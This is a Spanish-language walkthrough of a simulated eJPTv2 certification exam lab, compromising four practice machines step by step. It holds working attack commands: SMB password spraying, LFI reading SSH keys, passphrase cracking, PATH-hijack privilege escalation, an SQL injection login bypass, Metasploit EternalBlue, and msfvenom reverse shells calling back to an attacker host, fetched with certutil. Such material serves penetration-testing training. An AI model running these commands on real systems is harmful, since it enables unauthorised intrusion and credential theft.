# Laboratorio de preparación eJPTv2 | Simulación de examen

{% embed url="https://youtu.be/v20IsEd5nUU?si=5v8wrsLm_pxpzXXj" %}

## Enumeración de red - Descubrimientos de hosts y escaneo de puertos

```bash
ip a
nmap -sn 10.0.2.0/24 #manda paquetes ICMP a ese segmento de red
sudo nmap -sS --min-rate 5000 -p- --open 10.0.2.43,45,46,53,55 -oN tcp_scan.txt
grep '^[0-9]' tcp_scan.txt | cut -d '/' -f1 | sort -u | xargs | tr ' ' ','
nmap --open -p135,139,22,25,45,445,49665,49670,80 -sC -sV 10.0.2.43,45,46,53,55 -Pn -On full_scan.txt
```

## Primera Máquina

Servicios vulnerables: 22,25,80,139 y 445.

Nos creamos una carpeta para la primera máquina.

```bash
mkdir 10.0.2.43
```

Entramos por el puerto 80 y vemos una imagen de un evento griego. Tampoco en el código fuente hay cosas relevantes. Hacemos por lo tanto hacemos fuerza bruta a directorios.

```
dirb http://10.0.2.43:80 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

Por aquí no va el ataque. Ahora nos fijaremos en SMB.

```bash
smbclient -L 10.0.2.43 -N 
```

Como no vemos que permisos tenemos sobre esos recursos usamos este comando.

```bash
smbmap -H 10.0.2.43
crackmepexec smb 10.0.2.43 -u '' -p '' --shares
enum4linux 10.0.2.43
```

Realizamos conexón con el recurso anonymous.

```bash
smbclient //10.0.2.43/anonymous -N
```

Nos descargamos el archivo y nos creamos un archivo con las contraseñas mencionadas. También podemos listar usuarios.

```bash
crackmapexec smb 10.0.2.43 -u '' -p '' --users
```

Con las credenciales.

```bash
crackmapexec smb 10.0.2.43 -u helios -p passwords.txt 
```

Esas contraseñas no son válidas para el usuario helios.

```bash
smbmap -H 10.0.2.43 -u helios -p qwerty
```

Tenemos permisos a recursos que no teníamos antes.

```bash
smbclient //10.0.2.43/helios -U helios
```

Nos descargamos los archivos. Vemos que hemos encontrado una ruta oculta. Parece un WordPress por lo que añadimos el dominio al /etc/hosts.

```bash
10.0.2.43    symfonos.local
https://symfonos.local/h3l105/wp-admin
```

> Nota: también nos puede caer Drupal /drupscan) y Joomla (joomscan).

Enumeramos para el WordPress.

```bash
wpscan --url http://symfonos.local/h3l105 #nos enumera todo hasta plugins
```

Usamos searchsploit para ver los exploits de los plugins.

```bash
searchsploit wordpress mail masta
searchsploit site editor
```

Nos sale 3 exploits de masta.

```
searchsploit -m 40290 # nos lo traemos en la atacante
```

Vemos el contenido y encontramos una ruta por la que entramos en ella y descubrimos el /etc/passwd. Vamos a convertir LFI a RCE. Atentamos a la id\_rsa de los usuarios del sistema con la ruta anterior.

```bash
=/home/helios/.ssh/id_rsa
```

Tenemos la id\_rsa pero encriptada.

```bash
ssh helios@10.0.2.43
```

Se necesita la clave pública para iniciar sesión. Copiamos la id\_rsa el contenido y proporcionamos eso al inicio de sesión.

<pre><code>chmod 600 id_rsa
<strong>ssh -i id_rsa helios@10.0.2.43
</strong></code></pre>

Extraemos los hashes de la id\_rsa.

```bash
ssh2john id_rsa > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

Encontramos la passphrase.

```bash
ssh -i id_rsa helios@10.0.2.43 #poner xerox
```

Estamos dentro de la máquina víctima. Revisamos.

```bash
sudo -l
cat /etc/crontab
find / -perm -4000 -ls 2>/dev/null
```

Hay uno que nos llama la atención.

```bash
/opt/statuscheck
```

Con la herramienta strings podemos ver caracteres legibles.

```
strings /opt/statuscheck
```

Vemos que hay un curl y lo está buscando en el PATH del sistema. Vamos a hacer un PATH Hijacking.

```bash
export PATH=/tmp:$PATH #ruta principal cambiada
cd /tmp
echo '/bin/bash -p' > curl
chmod +x curl
./curl #inicia una sesión anidada
/opt/statuscheck #en el momento que encuentre curl obtendremos una bash
```

## Segunda máquina

Servicios vulnerables: 80.

No se acceden a los recursos de forma correcta y comprobamos el código fuente y descubrimos un dominio con el que lo añadimos a /etc/hosts.

```bash
10.0.2.53    doc.hmv
```

Enumeramos directorios.

```
nikto -url http://doc.hmv
```

En el panel de Login.

```
' OR==1;-- -'
```

Hacemos un captura con BurpSuite y lo guardamos en un fichero para hacer sqlmap.

```
sqlmap -r post_request
```

En el perfil podemos cambiar la imagen de perfil por lo que intentamos subir una Reverse Shell. Hacemos posteriormente un tratamiento de la TTY.

Encontrando el usuario bella.

```
cat /etc/passwd
```

Las credenciales también se pueden encontrar en el servidor web.

<pre class="language-bash"><code class="lang-bash"><strong>cat /var/www/html/traffic_offense/initialize.php
</strong></code></pre>

Encontramos unas credenciales para una base de datos. También vemos que a nivel del sistema son las mismas por lo que nos logueamos a bella.

## Tercera máquina

Servicios vulnerables: 135,139 y 445.

```
nmap -p445 --script="smb-vuln-*" 10.0.2.45
```

Vemos que hay un EternalBlue (ms17-010) y ms08-067.

```bash
msfconsole
search MS17-010
use 0
show options
setg RHOSTS 10.0.2.45
run
exploit #este módulo no sirve por no es soportable vamos a otro
use 1
run
```

```
search MS08-067
use 0
run
```

## Cuarta máquina

Servicios vulnerables: 80, 135,139 y 445.

Al parecer tenemos varios usuarios. Enumeramos directorios con dirbuster pero nada. Enumeramos para el servicio SMB.

```bash
crackmapexec smb 10.0.2.46 -u '' -p '' --shares
crackmapexec smb 10.0.2.46 -u usuarios.txt '' -p '' --shares
crackmapexec smb 10.0.2.46 -u usuarios.txt -p usuarios.txt --shares
```

Encontramos unas credenciales bogo:bogo.

```bash
smbclient //10.0.2.46/LOGS -U bogo
```

Nos descargamos ese archivo. Vemos un comando interesante.

```bash
crackmapexec smb 10.0.2.46 -u marcos -p SuperPassword --shares
```

Accedemos al recurso WEB con el usuario Marcos.

```bash
smbclient //10.0.2.46/WEB -U marcos
```

En ese directorio encontramos los mismos archivos que hay en el servicio web por lo que podemos subir cualquier archivo en lo que hacemos una Reverse Shell.  Creamos un archivo .aspx que son los php para estos casos con MSFVenom.

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=10.0.2.100 LPORT=443 -f aspx -o reverse.aspx
```

Lo subimos y nos ponemos en escucha.

```bash
nc -lvnp 443
```

Ya tenemos una shell de Windows. Creamos un ejecutable para que nos envíe una Reverse Shell meterpreter.

```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.0.2.100 LPORT=443 -f exe -o reverse.exe
```

Levantamos un servidor http con Python.

```bash
python3 - http.server 80
```

> Nota: cambiamos el nombre de del index.html porque revisa ese archivo para el Directory listing.

Nos movemos a Public/Downloads para obtener el archivo.

```bash
certutil.exe -f urlcache http://10.0.2.100/reverse.exe
```
